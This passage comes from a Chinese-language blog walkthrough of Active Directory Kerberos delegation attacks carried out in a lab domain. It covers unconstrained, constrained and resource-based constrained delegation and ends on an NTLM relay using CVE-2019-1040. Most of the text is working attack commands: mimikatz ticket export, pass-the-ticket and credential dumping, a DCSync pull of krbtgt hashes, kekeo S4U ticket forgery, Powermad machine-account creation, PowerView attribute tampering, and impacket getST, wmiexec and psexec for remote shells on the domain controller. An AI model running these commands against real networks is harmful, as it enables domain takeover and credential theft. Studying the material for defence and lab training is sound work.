<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406135014457.png"
                      alt="image-20230406135014457"
                ></p>
<p>回到域控执行，让域管理员访问Alice，就会在Alice主机中产生TGT票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\alice.hack-my.com</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406120142914.png"
                      alt="image-20230406120142914"
                ></p>
<p>回到Alice重新导出票据</p>
<p>但是不知道为什么还是没有administrator</p>
<p>只能看看别人的了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/v2-bcefc178a80cab8bb1a6792a7db72ff1_r.jpg"
                      alt="img"
                ></p>
<p>别人有admin</p>
<p>然后就利用下面这个命令，使用这个导出的票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;36eb98]-2-0-60a10000-Administrator@krbtgt-HAISHI.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>然后访问共享文件夹就可以访问得到了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\dc.hack-my.com\c$</span><br></pre></td></tr></table></figure></div>

<p>这种方式在实战情况下，除非域管理员连接过该服务，否则十分的鸡肋</p>
<h6 id="利用2"><a href="#利用2" class="headerlink" title="利用2"></a>利用2</h6><p>特定情况下可以利用打印机服务Spooler，让域控主动连接</p>
<p>主要原理就是强迫运行打印机服务（Print Spooler）的主机向目标主机发起Kerberos或者NTLM认证请求</p>
<p>因为在Spooler服务默认开启的情况下，域用户可以利用windows打印机系统远程协议（MS-RPRN）强制任何运行了Spooler服务的域内计算机通过Kerberos或NTLM对任何目标进行认证</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要</span><br><span class="line">administrator权限</span><br><span class="line">得到域用户的账户密码</span><br><span class="line">域控打开打印机服务</span><br></pre></td></tr></table></figure></div>

<h6 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>首先域控得先打开打印机服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406164452743.png"
                      alt="image-20230406164452743"
                ></p>
<p>有一种就是直接运行SpoolSample</p>
<p>指令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份</span><br></pre></td></tr></table></figure></div>

<p>这样就会生成一个票据，然后就和上面的一样了，导出票据，执行票据就行了</p>
<p>但是上面的票据，我实操没发现administraotr的票据</p>
<p>还有一种是使用Rubeus来监听的</p>
<p>先利用Rubeus在域用户主机上运行，需要本地管理员权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br><span class="line"># 我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT</span><br><span class="line"># /interval:1 设置监听间隔1秒</span><br><span class="line"># /filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT</span><br><span class="line"># DC$为域控的主机名字加$</span><br></pre></td></tr></table></figure></div>

<p>我的域用户主机rubeus运行不起来，应该要在域用户主机上生成</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406175636951.png"
                      alt="image-20230406175636951"
                ></p>
<p>这是别人的图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2e69c11052ca3f45e6ed166b0a86ed8f.png"
                      alt="img"
                ></p>
<p>然后利用SPoolSample让域控强制向本机验证身份</p>
<p>需要以域用户身份运行</p>
<p>具体操作</p>
<p>运行<code>runas /user:[http://haishi.com](https://link.zhihu.com/?target=http%3A//haishi.com)\many powershell</code>打开一个域用户权限的powershell</p>
<p>然后运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份，这样我们的Rubeus就可以监听到TGS了</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ea7756068b739208f63908f1a2c2e4d0.png"
                      alt="img"
                ></p>
<p>这个加了换行，所以可以用python去掉换行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&quot;&quot;</span><br><span class="line">for line in open(&#x27;1.txt&#x27;,&#x27;r&#x27;):</span><br><span class="line">    data += line.strip(&#x27;\n&#x27;)</span><br><span class="line">with open(&quot;2.txt&quot;,&#x27;a&#x27;) as f:</span><br><span class="line">    f.write(data)</span><br><span class="line">print(&#x27;保存完毕&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>复制2.txt中的TGT</p>
<p>本地管理员权限运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:2.txt中的TGT值</span><br></pre></td></tr></table></figure></div>

<p>然后mimikatz执行，就可以获取krbtgt的NTLM hash值了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</span><br></pre></td></tr></table></figure></div>

<p>然后也能用smbexec.py获取域控权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python smbexec.py -hashes :NTLM-HASH administrator@192.168.30.10</span><br></pre></td></tr></table></figure></div>

<h4 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>由于非约束委派的不安全性，微软在win2003中发布了约束委派功能，对Kerberos协议进行了拓展，引入了S4U协议：S4U2Self和S4U2proxy。</p>
<h6 id="S4U2Self：用于生成本身服务TGS票据"><a href="#S4U2Self：用于生成本身服务TGS票据" class="headerlink" title="S4U2Self：用于生成本身服务TGS票据"></a>S4U2Self：用于生成本身服务TGS票据</h6><p>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户的对当前受约束委派服务的票据TGS，改服务票据TGS包含了用户的相关信息，如用户的信息组等</p>
<h6 id="S4U2proxy：保证只能访问特定服务（最大区别）"><a href="#S4U2proxy：保证只能访问特定服务（最大区别）" class="headerlink" title="S4U2proxy：保证只能访问特定服务（最大区别）"></a>S4U2proxy：保证只能访问特定服务（最大区别）</h6><p>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务</p>
<p>在约束委派中，用户还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务作了限制</p>
<p>他不允许受委派的服务代表用户使用这个TGT去访问任意服务，而只能访问指定服务</p>
<h6 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h6><p>通过上述了解，如果我们获取了service1的权限之后，就可以伪造S4U先请求service1本身的一个ST，然后利用这个ST便可以伪造任意用户请求去获取service2的ST了</p>
<h6 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h6><p>对win2008设置约束委派，委派win2008可以访问DC的CIFS请求</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406210828223.png"
                      alt="image-20230406210828223"
                ></p>
<p>服务账户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406205915345.png"
                      alt="image-20230406205915345"
                ></p>
<p>然后利用adfind查询约束委派主机的机器用户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406210930711.png"
                      alt="image-20230406210930711"
                ></p>
<p>查询服务账户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406211118085.png"
                      alt="image-20230406211118085"
                ></p>
<h6 id="利用1"><a href="#利用1" class="headerlink" title="利用1"></a>利用1</h6><p>使用机器账户wein2008-web</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件</span><br><span class="line">administrator权限</span><br><span class="line">获取了位置了约束委派的服务账户或者机器账户的凭据、密码或者hash都可</span><br></pre></td></tr></table></figure></div>

<p>先通过mimikatz获取web的票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot;&quot;sekurlsa::tickets /export&quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406213220426.png"
                      alt="image-20230406213220426"
                ></p>
<p>然后再用kekeo申请服务票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:[0;3e7]-2-2-40e10000-WEB$@krbtgt-HACK-MY.COM.kirbi /user:Administrator@hack-my.com /service:cifs/DC.hack-my.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406213404970.png"
                      alt="image-20230406213404970"
                ></p>
<p>使用mimikatz导入票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@HACK-MY.com@HACK-MY.COM_cifs~DC.haishi.com@HACK-MY.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>之后<code>dir \\dc.hack-my.com\c$</code>就可以访问了</p>
<h6 id="利用2-1"><a href="#利用2-1" class="headerlink" title="利用2"></a>利用2</h6><p>使用机器账户的hash</p>
<p>要先获取机器账户的hash（mmimikatz）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot;&quot;sekurlsa::logonpasswords&quot;&quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406214505772.png"
                      alt="image-20230406214505772"
                ></p>
<p>使用kekeo请求win2008-web的TGT票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:win2008-web /domain:hack-my.com /NTLM:48b1ee6132349190ee7c47d4b5d91608&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406214622142.png"
                      alt="image-20230406214622142"
                ></p>
<p>伪造S4U请求，伪造Administrator用户权限访问受委派的CIFS服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 申请administrator权限的票据</span><br><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_win2008-web@HACK-MY.COM_krbtgt~hack-my.com@HACK-MY.COM.kirbi /user:Administrator /service:cifs/dc.hack-my.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406215440285.png"
                      alt="image-20230406215440285"
                ></p>
<p>然后使用mimikatz导入S4U2proxy阶段生成的ST，便可以进行成功的访问CIFS服务</p>
<p><code>dir \\dc.hack-my.com\c$</code></p>
<h6 id="利用3"><a href="#利用3" class="headerlink" title="利用3"></a>利用3</h6><p>在获取hash值之后</p>
<p>就可以利用impacket套件里面的getST直接获取shell</p>
<p>用getST申请服务票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.30.10 -spn CIFS/dc.hack-my.com -impersonate administrator hack-my.com/WIN2008-WEB$ -hashes :48b1ee6132349190ee7c47d4b5d91608</span><br></pre></td></tr></table></figure></div>

<p>然后就可以导入票据了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 wmiexec.py -k hack-my.com/administrator@dc.hack-my.com -no-pass -dc-ip 192.168.30.10</span><br><span class="line"></span><br><span class="line">或者（权限更高）</span><br><span class="line">python3 psexec.py -no-pass -k dc.hack-my.com -dc-ip 192.168.30.10</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>然后就可以远程连接了</p>
<p>注意这里需要将域名加入host中</p>
<p><code>192.168.30.10 dc.hack-my.com</code></p>
<h6 id="利用4"><a href="#利用4" class="headerlink" title="利用4"></a>利用4</h6><p>使用服务账户Alice</p>
<p>可以直接使用密码</p>
<p>首先利用kekeo申请TGT（ST）票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:Alice /domain:hack-my.com /password:Admin！@#45 /ticket:Alice.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>然后就可以利用这个TGT去伪造其他用户来申请一个TGS的票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;Tgs::s4u /tgt:TGT_Alice@HACK-MY.COM_krbtgt~hack-my.com@HACK-MY.COM.kirbi /user:administrator@hack-my.com /service:cifs/dc.hack-my.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>然后就可以利用mimikatz将这个TGS票据导入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@hack-my.com@HACK-MY.COM_cifs~DC.hack-my.com@HACK-MY.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>然后就可以访问</p>
<p><code>dir \\dc.hack-my.com\c$</code></p>
<p>还有就是一个获取服务账户的hash来进行的，和上面的差不多就不说了</p>
<h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>基于资源的约束性委派是在win2012中加入的，和传统的委派相比，不需要域管理员权限去设置相关属性</p>
<p>基于资源的约束委派允许资源配置受信任的账户委派给他们</p>
<p>基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员</p>
<p>这是因为上面的特性，这就导致了正常只要是域用户都有权限进行委派的操作</p>
<h6 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h6><p>委派的权限给到了拥有资源的后端，而不再是赋值的前端</p>
<p>可以跨域和林委派</p>
<p>不用域管理员权限设置委派，只需拥有将计算机加入域的域用户和机器自身拥有的权限</p>
<h6 id="差别"><a href="#差别" class="headerlink" title="差别"></a>差别</h6><p>传统的委派是想办法让域控请求A这样A就可以利用域控的身份去请求B的服务</p>
<p>基于资源的约束委派则是相反的，它是改变A的SID，达到让A模拟用户访问B资源的目的</p>
<p>msDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户</p>
<h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ol>
<li><p>具有对主机修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限</p>
<p>(如已经控制的主机是WEB 则具有修改WEB主机的msDS-AllowedToActOnBehalfOfOtherIdentity的权限账户)</p>
</li>
<li><p>可以创建机器账户的域用户（或已知机器账户）</p>
</li>
</ol>
<p>服务账户可以将机器账户加入域，最多10个</p>
<p>能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的只有将主机加入域的用户和主机的机器账户</p>
<h6 id="怎么查看是谁把你加入域的"><a href="#怎么查看是谁把你加入域的" class="headerlink" title="怎么查看是谁把你加入域的"></a>怎么查看是谁把你加入域的</h6><p>账户中有个msDS-CreatorSID属性，用于标记加入域时使用的用户的SID值，这样就可以知道是谁把你加入域的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 192.168.30.20 -b &quot;DC=hack-my,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure></div>



<h6 id="Account-Operators组内用户"><a href="#Account-Operators组内用户" class="headerlink" title="Account Operators组内用户"></a>Account Operators组内用户</h6><p>Account Operators组内用户可以修改域内任意主机（除了域控）的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
<p>所以我们拿到了这个权限就可以拿到除域控外所有机器的system权限</p>
<h6 id="利用1-1"><a href="#利用1-1" class="headerlink" title="利用1"></a>利用1</h6><p>攻击思路：</p>
<p>前提是获取Alice权限</p>
<p>利用一个服务账户Alice创建一个机器账户</p>
<p>然后修改WIN2008-WEB的msDS-AllowedToActOnBehalfOfOtherIdentity 为新创建的机器用户的sid</p>
<p>然后利用机器账户申请票据 进行提权</p>
<h6 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h6><p>先利用Powermad.ps1创建一个机器账号</p>
<p>名字test1，密码123456</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test1 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407170719758.png"
                      alt="image-20230407170719758"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407171019208.png"
                      alt="image-20230407171019208"
                ></p>
<p>利用powerView查询机器账户的SID</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module .\PowerView.ps1</span><br><span class="line">Get-NetComputer test1 -Properties objectsid</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407220117870.png"
                      alt="image-20230407220117870"
                ></p>
<p>test1 sid：S-1-5-21-1400638014-602433399-2258725660-1148</p>
<p>设置委派</p>
<p>修改WEB的msds-allowedtoactonbehalfofotheridentity的值，把他的sid改为test1的sid</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用powerView</span><br><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1400638014-602433399-2258725660-1148)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WEB| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure></div>

<p>查询是否修改成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer WEB -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407220808294.png"
                      alt="image-20230407220808294"
                ></p>
<p>清除 msds-allowedtoactonbehalfofotheridentity 属性的值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-DomainObject WEB -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure></div>

<p>再生成票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.30.20 hack-my.com/test1\$:123456 -spn cifs/WEB.hack-my.com -impersonate administrator</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407221007040.png"
                      alt="image-20230407221007040"
                ></p>
<p>最后导入票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB.haishi.com -no-pass -k -dc-ip 192.168.30.20</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408124248309.png"
                      alt="image-20230408124248309"
                ></p>
<p>这里还是需要将域名加入到hosts</p>
<p>利用psexec上去的权限更高</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -k haishi.com/administrator@WEB.haishi.com -no-pass</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408124555238.png"
                      alt="image-20230408124555238"
                ></p>
<h6 id="利用2-2"><a href="#利用2-2" class="headerlink" title="利用2"></a>利用2</h6><p>刚才讲过Acount Operators组用户可以获得除域控外所有主机的权限</p>
<p>是因为Acount Operators组成员可以修改域内除了域控其他所有主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
<p>在本地先设置一个Acount Operators组成员，设置Alice为这个</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408151945659.png"
                      alt="image-20230408151945659"
                ></p>
<p>可以利用Adfind查询Acount Operators组成员</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 192.168.30.10:389 -s subtree -b CN=&quot;Account Operators&quot;,CN=Builtin,DC=hack-my,DC=com member</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408152951481.png"
                      alt="image-20230408152951481"
                ></p>
<p>然后创建一个机器账户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test3 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408153516233.png"
                      alt="image-20230408153516233"
                ></p>
<p>设置委派</p>
<p>查询test3的sid</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">Get-NetComputer test3 -Properties objectsid</span><br></pre></td></tr></table></figure></div>

<p>test3 sid:S-1-5-21-1400638014-602433399-2258725660-1152</p>
<p>修改WEB的msds-allowedtoactonbehalfofotheridentity的值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1400638014-602433399-2258725660-1152)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WEB| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure></div>

<p>生成票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.30.10 hack-my.com/test3\$:123456 -spn cifs/WEB.hack-my.com -impersonate administrator</span><br></pre></td></tr></table></figure></div>

<p>将生成的票据导入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB.hack-my.com -no-pass -k -dc-ip 192.168.30.10</span><br></pre></td></tr></table></figure></div>

<p>然后就获得主机的控制权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408154535638.png"
                      alt="image-20230408154535638"
                ></p>
<h6 id="利用3-1"><a href="#利用3-1" class="headerlink" title="利用3"></a>利用3</h6><p>结合HTLM Relay接管域控（CVE-2019-1040）</p>
<p>需要用到辅助域控win2016</p>
<p>DC2 10.150.127.186</p>
<p>首先就是创建一个机器用户test2 123456</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test2 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408155940211.png"
                      alt="image-20230408155940211"
                ></p>
<p>然后开启监听</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldap://10.150.127.166 -smb2support --remove-mic --delegate-access --escalate-user test2\$</span><br></pre></td></tr></table></figure></div>

<p>然后利用打印机漏洞</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py haishi.com/many:asd123\!\@10.150.127.186 10.150.127.128</span><br></pre></td></tr></table></figure></div>

<p>然后申请票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py haishi.com/test2\$:123456 -spn CIFS/DC2.haishi.com -impersonate Administrator -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure></div>

<p>导入票据</p>
